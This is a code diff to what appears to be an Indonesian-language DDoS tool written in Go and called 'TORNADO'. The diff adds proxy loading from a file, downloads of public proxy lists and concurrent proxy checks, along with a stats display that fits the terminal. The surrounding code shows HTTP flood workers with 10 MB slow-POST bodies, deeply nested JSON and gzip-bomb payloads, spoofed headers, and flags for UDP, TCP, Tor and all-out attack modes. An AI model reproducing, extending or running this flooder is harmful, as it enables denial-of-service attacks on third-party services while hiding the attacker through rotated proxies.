@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bufio"
 	"bytes"
 	"compress/gzip"
 	"context"
@@ -15,6 +16,7 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"regexp"
 	"strconv"
 	"strings"
 	"sync"
@@ -26,6 +28,7 @@ import (
 	"github.com/redis/go-redis/v9"
 	"golang.org/x/net/http2"
 	"golang.org/x/net/proxy"
+	"golang.org/x/term"
 )
 
 // ==================== BANNER (DENGAN WARNA) ====================
@@ -61,6 +64,7 @@ var (
 	enableRUDY    bool
 	verbose       bool
 	attackAll     bool
+	proxyFile     string
 
 	stats struct {
 		total   uint64
@@ -76,47 +80,128 @@ var (
 	ctx         = context.Background()
 )
 
+// ==================== FUNGSI BANTU UNTUK TERMINAL ====================
+func getTerminalWidth() int {
+	width, _, err := term.GetSize(int(os.Stdout.Fd()))
+	if err != nil {
+		return 80 // fallback
+	}
+	if width < 20 {
+		return 20
+	}
+	return width
+}
+
+func stripANSI(s string) string {
+	re := regexp.MustCompile(`\x1b\[[0-9;]*m`)
+	return re.ReplaceAllString(s, "")
+}
+
+func truncateText(text string, maxLen int) string {
+	if len(text) <= maxLen {
+		return text
+	}
+	return text[:maxLen-3] + "..."
+}
+
 // ==================== PROXY MANAGER ====================
 func fetchProxies() {
-	if !enableProxy {
+	if !enableProxy && proxyFile == "" {
 		return
 	}
+
+	if proxyFile != "" {
+		fmt.Printf("[*] Membaca proxy dari file: %s\n", proxyFile)
+		file, err := os.Open(proxyFile)
+		if err != nil {
+			fmt.Printf("[!] Gagal buka file proxy: %v\n", err)
+			return
+		}
+		defer file.Close()
+		scanner := bufio.NewScanner(file)
+		for scanner.Scan() {
+			line := strings.TrimSpace(scanner.Text())
+			if line != "" && strings.Contains(line, ":") {
+				proxyList = append(proxyList, line)
+			}
+		}
+		if len(proxyList) > 0 {
+			fmt.Printf("[*] %d proxy dari file siap pakai.\n", len(proxyList))
+			return
+		}
+		fmt.Println("[!] File proxy kosong, beralih ke download otomatis.")
+	}
+
 	fmt.Println("[*] Mengunduh proxy dari internet...")
+	client := &http.Client{
+		Timeout: 10 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+		},
+	}
+
 	sources := []string{
 		"https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
 		"https://www.proxy-list.download/api/v1/get?type=http",
 		"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+		"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+		"https://proxylist.rip/proxy/http/format/txt/",
 	}
 	all := make(map[string]bool)
 	for _, src := range sources {
-		resp, err := http.Get(src)
-		if err == nil {
-			body, _ := io.ReadAll(resp.Body)
-			for _, line := range strings.Split(string(body), "\n") {
-				line = strings.TrimSpace(line)
-				if strings.Contains(line, ":") && !strings.Contains(line, "[") {
-					all[line] = true
+		resp, err := client.Get(src)
+		if err != nil {
+			if verbose {
+				fmt.Printf("[!] Gagal ambil %s: %v\n", src, err)
+			}
+			continue
+		}
+		body, err := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if err != nil {
+			continue
+		}
+		for _, line := range strings.Split(string(body), "\n") {
+			line = strings.TrimSpace(line)
+			if strings.Contains(line, ":") && !strings.Contains(line, "[") && !strings.Contains(line, "#") {
+				parts := strings.Split(line, ":")
+				if len(parts) == 2 {
+					if net.ParseIP(parts[0]) != nil {
+						all[line] = true
+					}
 				}
 			}
-			resp.Body.Close()
 		}
 	}
 	for p := range all {
 		proxyList = append(proxyList, p)
 	}
-	// Filter yang hidup
+
+	fmt.Printf("[*] Menguji %d proxy...\n", len(proxyList))
 	alive := []string{}
+	var muAlive sync.Mutex
+	var wg sync.WaitGroup
+	sem := make(chan struct{}, 50)
 	for _, p := range proxyList {
-		parts := strings.Split(p, ":")
-		if len(parts) != 2 {
-			continue
-		}
-		conn, err := net.DialTimeout("tcp", p, 1*time.Second)
-		if err == nil {
-			conn.Close()
-			alive = append(alive, p)
-		}
+		wg.Add(1)
+		go func(proxy string) {
+			defer wg.Done()
+			sem <- struct{}{}
+			defer func() { <-sem }()
+			parts := strings.Split(proxy, ":")
+			if len(parts) != 2 {
+				return
+			}
+			conn, err := net.DialTimeout("tcp", proxy, 1*time.Second)
+			if err == nil {
+				conn.Close()
+				muAlive.Lock()
+				alive = append(alive, proxy)
+				muAlive.Unlock()
+			}
+		}(p)
 	}
+	wg.Wait()
 	proxyList = alive
 	fmt.Printf("[*] %d proxy hidup siap pakai.\n", len(proxyList))
 }
@@ -267,7 +352,6 @@ func gzipBomb() []byte {
 	}
 	var buf bytes.Buffer
 	gz := gzip.NewWriter(&buf)
-	// 1MB data compressed to ~1KB
 	largeData := bytes.Repeat([]byte("A"), 1024*1024)
 	gz.Write(largeData)
 	gz.Close()
@@ -298,22 +382,19 @@ func httpWorker(methodList []string) {
 		case <-stopChan:
 			return
 		default:
-			// 1. Proxy rotation
 			proxyAddr := getProxy()
 			if proxyAddr != "" && enableProxy {
 				proxyURL, _ := url.Parse("http://" + proxyAddr)
 				tr.Proxy = http.ProxyURL(proxyURL)
 			}
 
-			// 2. Random method
 			method := methodList[rand.Intn(len(methodList))]
 
-			// 3. Payload
 			var body io.Reader
 			var payload []byte
 			if method == "POST" || method == "PUT" || method == "PATCH" {
 				if enableRUDY && rand.Intn(3) == 0 {
-					payload = bytes.Repeat([]byte("X"), 1024*1024*10) // 10MB
+					payload = bytes.Repeat([]byte("X"), 1024*1024*10)
 				} else if enableDeepJSON {
 					data := deepJSON()
 					payload, _ = json.Marshal(data)
@@ -327,7 +408,6 @@ func httpWorker(methodList []string) {
 				body = nil
 			}
 
-			// 4. Build URL dengan random parameters
 			parsed, _ := url.Parse(targetURL)
 			q := parsed.Query()
 			for i := 0; i < 10; i++ {
@@ -337,7 +417,6 @@ func httpWorker(methodList []string) {
 			fullURL := parsed.String()
 
 			req, _ := http.NewRequest(method, fullURL, body)
-			// 5. Headers + Spoofing
 			req.Header.Set("User-Agent", randString(20))
 			req.Header.Set("Accept", "*/*")
 			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
@@ -352,7 +431,6 @@ func httpWorker(methodList []string) {
 				req.Header.Set("Content-Encoding", "gzip")
 			}
 
-			// 6. Kirim
 			start := time.Now()
 			resp, err := client.Do(req)
 			if err != nil {
@@ -382,7 +460,7 @@ func httpWorker(methodList []string) {
 	}
 }
 
-// ==================== STATS PRINTER ====================
+// ==================== STATS PRINTER ADAPTIF LAYAR HP (DENGAN 🌪) ====================
 func statsPrinter() {
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
@@ -394,8 +472,34 @@ func statsPrinter() {
 			total := atomic.LoadUint64(&stats.total)
 			success := atomic.LoadUint64(&stats.success)
 			failed := atomic.LoadUint64(&stats.failed)
-			fmt.Printf("\r\033[93m[TORNADO] Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
-				total, success, failed, total/2)
+			rate := total / 2
+
+			width := getTerminalWidth()
+			// Bangun string statistik tanpa ANSI untuk dihitung panjangnya
+			raw := fmt.Sprintf("🌪 Total: %d | Sukses: %d | Gagal: %d | Rate: %d req/s", total, success, failed, rate)
+			clean := stripANSI(raw)
+			cleanLen := len(clean)
+
+			if cleanLen <= width {
+				// Muat dalam satu baris
+				fmt.Printf("\r\033[93m🌪 Total: \033[97m%d \033[93m| Sukses: \033[92m%d \033[93m| Gagal: \033[91m%d \033[93m| Rate: \033[97m%d req/s\033[0m",
+					total, success, failed, rate)
+			} else {
+				// Tidak muat → cetak dalam 2 baris
+				line1 := fmt.Sprintf("Total: %d | Sukses: %d | Gagal: %d", total, success, failed)
+				line2 := fmt.Sprintf("Rate: %d req/s", rate)
+				maxLineWidth := width - 4
+				if len(line1) > maxLineWidth {
+					line1 = truncateText(line1, maxLineWidth)
+				}
+				if len(line2) > maxLineWidth {
+					line2 = truncateText(line2, maxLineWidth)
+				}
+				fmt.Printf("\r\033[K")
+				fmt.Printf("\033[93m🌪\033[0m\n")
+				fmt.Printf("%s\n", line1)
+				fmt.Printf("%s", line2)
+			}
 		}
 	}
 }
@@ -433,6 +537,7 @@ func main() {
 	flag.StringVar(&methods, "m", "GET,POST", "Metode HTTP (pisah koma)")
 	flag.BoolVar(&enableHTTP2, "http2", false, "HTTP/2 multiplexing")
 	flag.BoolVar(&enableProxy, "proxy", false, "Proxy auto-rotate + filter")
+	flag.StringVar(&proxyFile, "proxy-file", "", "File proxy manual (ip:port per baris)")
 	flag.BoolVar(&enableTor, "tor", false, "Lewatkan Tor (SOCKS5)")
 	flag.BoolVar(&enableUDP, "udp", false, "UDP flood")
 	flag.BoolVar(&enableTCP, "tcp", false, "TCP flood (SYN simulasi)")
@@ -505,8 +610,12 @@ func main() {
 	}
 
 	// Proxy
-	if enableProxy {
+	if enableProxy || proxyFile != "" {
 		fetchProxies()
+		if len(proxyList) == 0 {
+			fmt.Println("[!] Tidak ada proxy tersedia, lanjut tanpa proxy.")
+			enableProxy = false
+		}
 	}
 
 	stopChan = make(chan struct{})
@@ -535,7 +644,7 @@ func main() {
 		go redisListener()
 	}
 
-	// Stats printer
+	// Stats printer (ADAPTIF dengan 🌪)
 	go statsPrinter()
 
 	// HTTP Workers
